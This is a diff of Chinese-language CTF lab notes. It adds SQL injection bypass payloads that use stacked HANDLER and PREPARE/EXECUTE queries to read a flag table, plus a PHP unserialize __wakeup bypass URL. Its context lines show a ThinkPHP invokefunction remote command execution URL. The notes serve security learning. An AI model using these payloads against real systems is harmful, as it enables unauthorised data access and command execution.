@@ -132,6 +132,8 @@ SQLMAP使用：
 * ```-C``` 指定字段（字段名要加双引号）
 * ```--dump``` 获取指定字段的值
 
+2020.2.24.Mon
+
 ---
 
 
@@ -161,7 +163,7 @@ SQLMAP使用：
 > 4. 查看flag  
 > http://192.168.100.161:54064/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat%20/flag
 
-**总结**：奇怪的知识盲区增加了，看来php框架也得学一下；flag文件还有可能在根目录等，最好用find搜索一下
+**总结**：奇怪的知识盲区增加了，看来php框架也得学一下；flag文件还有可能在根目录等，最好用find搜索一下  2020.7.16.Thu
 
 ---
 
@@ -199,7 +201,7 @@ SQLMAP使用：
 2. ```strstr```（判断字符串中是否包含某子串）可用大小写绕过；
 3. ```file_get_contents```8行的时候可尝试```show_source```
 4. include的url要包含协议
-5. 可通过phpinfo查看system之类的敏感函数是否被禁用
+5. 可通过phpinfo查看system之类的敏感函数是否被禁用  2020.7.31.Fri
 
 ---
 
@@ -276,7 +278,71 @@ SQLMAP使用：
         * Oracle不可用
         * 没有相应的权限限制
 4. 过滤了```select```之类的关键词的话，看有没有过滤```rename```和```alert```，如果没有则尝试通过修改表名、表结构（字段）来使用默认的查询来获取数据（要一次完成，否则表不存在会一直报错，无法继续修改）
+5. 过滤了`select`的话，还可尝试用`handler`读表：  
+[@jesseyoung《mysql查询语句-handler》（blog.csdn.net/JesseYoung/article/details/40785137）](https://blog.csdn.net/JesseYoung/article/details/40785137)
+    ```sql
+    1'; HANDLER `1919810931114514` OPEN; HANDLER `1919810931114514` READ FIRST #
+    ```
+6. 过滤了关键字的时候，可以尝试`concat`查询字符串然后`prepare`再`execute`：  
+[@GeaoZhang《MySQL的SQL预处理(Prepared)》（cnblogs.com/geaozhang/p/9891338.html）](https://www.cnblogs.com/geaozhang/p/9891338.html)
+    ```sql
+    1';SET @sql=concat('s','elect `flag` from `1919810931114514`');PREPARE stmt1 FROM @sql;EXECUTE stmt1; #
+    ```
+    PHP的`strstr`可尝试大小写绕过，`stristr`才忽略大小写  
 2. 最后记得注释掉后面的语句
-3. 语句中的表名是数字时要加反引号
+3. 语句中的表名是数字时要加反引号  2020.8.3.Mon
+
+---
+
+
+# 7. unserialize3
+
+**题目来源**：暂无  
+**题目描述**：暂无
+
+**WP**:
+> **原理**  
+> PHP反序列化漏洞：执行`unserialize()`时，先会调用`__wakeup()`。  
+> 当序列化字符串中属性值个数大于属性个数，就会导致反序列化异常，从而跳过`__wakeup()`。
+> 
+> **目的**  
+> 了解绕过常见的函数过滤机制
+> 
+> **环境**  
+> linux
+> 
+> **工具**  
+> chrome
+> 
+> **步骤**  
+> 1. 打开题目，进行代码审计，可以看到xctf类只拥有一个public的flag变量，值为111。
+> 
+> 2. public属性序列化后格式为：  
+>       ```php
+>       数据类型:属性名长度:"属性名";数据类型:属性值长度:"属性值"
+>       ```
+> 
+> 3. 本题目中，只存在一个变量，正常情况下序列化后，如下所示。  
+>       ```php
+>       O:4:"xctf":1:{s:4:"flag";s:3:"111";}
+>       ```
+> 
+> 4. 将设置属性值为2，可导致反序列化异常，如下所示。  
+>       ```php
+>       O:4:"xctf":2:{s:4:"flag";s:3:"111";}
+>       ```
+> 
+> 4. 根据代码中的`?code=`可得知，将得到的序列化字符串赋值给code进行传递。
+> 
+> 5. 访问
+>       ```
+>       http://111.198.29.45:34517?code=O:4:"xctf":2:{s:4:"flag";s:3:"111";}
+>       ```
+>       得到flag，如图所示。
+
+**总结**：
+1. 执行`unserialize()`时，当序列化字符串中属性值个数大于属性个数，就会导致反序列化异常，从而跳过`__wakeup()`
+2. 本题中将最前面表示对象类型的“O”改成小写“o”或者改各个长度和类型字段也行  2020.8.26.Wed
+
 
 _//未完待xu_
